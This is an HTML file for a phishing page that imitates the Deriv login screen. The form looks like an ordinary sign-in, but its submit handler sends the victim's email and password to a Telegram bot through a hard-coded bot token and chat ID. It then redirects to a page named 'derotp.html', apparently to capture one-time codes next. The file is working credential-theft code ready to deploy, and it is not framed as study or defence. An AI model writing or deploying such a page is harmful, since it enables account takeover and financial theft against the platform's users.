<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Deriv Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .card {
            border-radius: 20px;
        }
        
        .form-control:focus {
            box-shadow: none;
            border-color: #dc3545;
        }
        
        .btn:focus {
            box-shadow: none;
            border-color: #dc3545;
        }
        
        .toggle-password-button {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            padding: 0;
            color: #6c757d;
        }
    </style>
</head>

<body class="bg-light">
    <div class="container d-flex flex-column align-items-center justify-content-center vh-100">
        <div class="text-center mb-4">
            <h1 class="text-danger fw-bold">deriv</h1>
        </div>
        <div class="card shadow p-4" style="max-width: 400px; width: 100%;">
            <h5 class="text-center mb-4">Welcome back</h5>
            <form id="loginForm">
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="example@email.com" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <div class="position-relative">
                        <input type="password" class="form-control" id="password" placeholder="Password" required>
                        <button class="toggle-password-button" type="button" id="togglePassword">
              <i class="fas fa-eye-slash" id="eyeIcon"></i>
            </button>
                    </div>
                </div>
                <div class="mb-3 text-end">
                    <a href="#" class="text-danger text-decoration-none">Forgot password?</a>
                </div>
                <button type="submit" class="btn btn-danger w-100 mb-3">Log in</button>
                <div class="d-flex align-items-center mb-3">
                    <hr class="flex-grow-1">
                    <span class="mx-2 text-muted">Or continue with</span>
                    <hr class="flex-grow-1">
                </div>
                <button class="btn btn-outline-danger w-100 mb-2">
          <i class="fas fa-fingerprint me-2"></i>Log in with biometrics
        <button class="btn btn-light w-100 mb-2" onclick="location.href='first.html';">
      <img src="https://www.google.com/favicon.ico" alt="Google" width="20" class="me-2">Google
        </button>
                <button class="btn btn-primary w-100">
          <i class="fab fa-facebook-f me-2"></i>Facebook
        </button>
            </form>
        </div>
    </div>

    <script>
        // Toggle password visibility
        document.getElementById("togglePassword").addEventListener("click", function() {
            const passwordInput = document.getElementById("password");
            const eyeIcon = document.getElementById("eyeIcon");

            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                eyeIcon.classList.remove("fa-eye-slash");
                eyeIcon.classList.add("fa-eye");
            } else {
                passwordInput.type = "password";
                eyeIcon.classList.remove("fa-eye");
                eyeIcon.classList.add("fa-eye-slash");
            }
        });

        // Form submission
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
            const chatId = '5615316142';
            const message = `Email: ${email}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = 'derotp.html';
                    } else {
                        alert('Error sending credentials.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Something went wrong.');
                });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
